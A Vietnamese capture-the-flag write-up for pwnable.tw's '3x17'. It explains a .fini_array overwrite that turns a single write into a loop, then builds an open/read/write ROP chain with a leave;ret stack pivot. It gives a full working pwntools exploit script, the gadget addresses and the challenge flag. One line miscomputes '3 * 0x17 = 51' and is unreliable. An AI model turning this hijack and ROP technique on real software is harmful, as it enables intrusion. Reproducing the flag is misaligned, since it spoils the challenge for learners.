+++
title = 'Pwnable.tw - 3x17'
date = 2026-09-17T10:33:53+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## 3x17

`nc chall.pwnable.tw 10105`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/3x17/3x17
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

Binary `static`, không PIE, stripped. `main` ở `0x401b6d`:

```c
printf("addr:");
read(0, buf, 0x18);
addr = strtoul(buf, 0, 10);      // base 10, cắt xuống int
printf("data:");
read(0, addr, 0x18);             // ghi 0x18 bytes vào địa chỉ tùy ý
```

Một primitive **write-what-where** 24 bytes, nhưng có một biến đếm global ở `0x4b9330`: phải bằng `1` mới cho ghi, và nó tăng mỗi lần `main` chạy, wrap theo modulo 256.

Nghĩa là mặc định ta chỉ được ghi **đúng một lần**, vì sau đó chương trình thoát.

#### `.fini_array`

`.fini_array` ở `0x4b40f0`, ban đầu chứa `[__libc_csu_init, __libc_csu_fini]`, và được `__libc_csu_fini` (`0x402960`) duyệt khi chương trình thoát. Vì `Partial RELRO`, vùng này **ghi được**.

Tên bài `3x17` chính là gợi ý: `3 * 0x17 = 51`, số lần ghi cần thiết để dựng xong ROP chain.

### 2. Khai thác

#### Biến 1 lần ghi thành vòng lặp vô hạn

Ghi vào `.fini_array`:

```py
fini_array = [0x402960,   # __libc_csu_fini
              0x401b6d]   # main
```

`__libc_csu_fini` duyệt mảng từ cuối về đầu: nó gọi `[fini_array+8]` = `main`, rồi gọi tiếp `[fini_array+0]` = chính `__libc_csu_fini`, và cứ thế lặp mãi. Mỗi 256 lần `main` chạy thì biến đếm wrap về `1`, cho ta thêm một lần ghi 24 bytes nữa.

Từ 1 lần ghi thành ghi tùy ý không giới hạn.

#### Dựng ROP chain trong `.data`

Ghi chain vào `0x4b4100` (`fini_array + 0x10`) theo từng khối 24 bytes:

```py
rop = build_rop()
for i in range(len(rop)//24):
    write_any(io, rop_base + i*24, rop[i*24:(i+1)*24])
```

Gadget đọc trực tiếp từ binary:

```js
pop rdi ; ret      = 0x401696
pop rsi ; ret      = 0x406c30
pop rdx ; ret      = 0x446e35
pop rax ; ret      = 0x41e4af
syscall ; ret      = 0x471db5
syscall ; jmp -8   = 0x4022b4
leave ; ret        = 0x401c4b
ret                = 0x401016
```

#### Stack pivot

Lần ghi cuối đổi `.fini_array` thành:

```py
fini_array = [0x401c4b,   # leave ; ret
              0x401016]   # ret
```

Prologue của `__libc_csu_fini` đã set `rbp = fini_array`, nên `leave ; ret` pivot `rsp` sang `.data` và `ret` cuối rơi vào đầu chain.

Chỗ này phải **ghi đúng 16 bytes**, không phải 24. Nếu gửi đủ 24 bytes thì qword padding sẽ đè lên gadget đầu tiên của chain ở `0x4b4100`.

#### ORW chain

`/home/3x17/flag` không tồn tại trên server. Dùng `getdents` (syscall 78) liệt kê thư mục thì thấy tên file thật là `/home/3x17/the_4ns_is_51_fl4g`.

Chain gọi `open` → `read` → `write`. Vì không biết `open` trả về fd nào nên thử lần lượt fd `3..9`; các `read` thất bại trả `-1` và không đụng vào buffer:

```py
c  = sys(2, path, 0, 0)                      # open(path, O_RDONLY)
for fd in range(3, 10):
    c += sys(0, fd, bufp, 0x80)              # read(fd, buf, 0x80)
c += sys(1, 1, bufp, 0x80, ra=syscall_loop)  # write(1, buf, 0x80)
```

Gadget cuối dùng `syscall ; jmp -8` để chương trình kẹt lại thay vì chạy tiếp vào rác.

```bash
[*] flag: FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
```

`FLAG: FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}`

```py
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch    = 'amd64'

HOST, PORT = 'chall.pwnable.tw', 10105
FLAG_PATH  = b'/home/3x17/the_4ns_is_51_fl4g\x00'

fini_array, rop_base = 0x4b40f0, 0x4b4100
libc_csu_fini, main_addr = 0x402960, 0x401b6d
pop_rdi, pop_rsi, pop_rdx, pop_rax = 0x401696, 0x406c30, 0x446e35, 0x41e4af
syscall_ret, syscall_loop = 0x471db5, 0x4022b4
leave_ret, ret = 0x401c4b, 0x401016

def write_any(io, addr, data):
    io.recvuntil(b'addr:')
    io.sendline(str(addr).encode())   # parsed as DECIMAL
    io.recvuntil(b'data:')
    io.send(data)

def build_rop():
    base, path, bufp = rop_base, rop_base + 0x290, rop_base + 0x2a0
    def sys(num, a1, a2, a3, ra=syscall_ret):
        return (p64(pop_rdi)+p64(a1)+p64(pop_rsi)+p64(a2)+
                p64(pop_rdx)+p64(a3)+p64(pop_rax)+p64(num)+p64(ra))
    c  = sys(2, path, 0, 0)                      # open(path, O_RDONLY)
    for fd in range(3, 10):                      # read(fd, buf, 0x80)
        c += sys(0, fd, bufp, 0x80)
    c += sys(1, 1, bufp, 0x80, ra=syscall_loop)  # write(1, buf, 0x80)
    return c.ljust(0x290, b'\x00') + FLAG_PATH + b'\x00'*0x80

def main():
    io = remote(HOST, PORT)
    # infinite loop: csu_fini -> main -> csu_fini ...
    write_any(io, fini_array, p64(libc_csu_fini) + p64(main_addr))
    rop = build_rop()
    for i in range(len(rop)//24):
        write_any(io, rop_base + i*24, rop[i*24:(i+1)*24])
    # pivot to ROP (16 bytes only!)
    write_any(io, fini_array, p64(leave_ret) + p64(ret))
    out = io.recvrepeat(5)
    log.success(f'flag: {out.split(b"\\n")[0].decode()}')
    io.close()

if __name__ == '__main__':
    main()
```
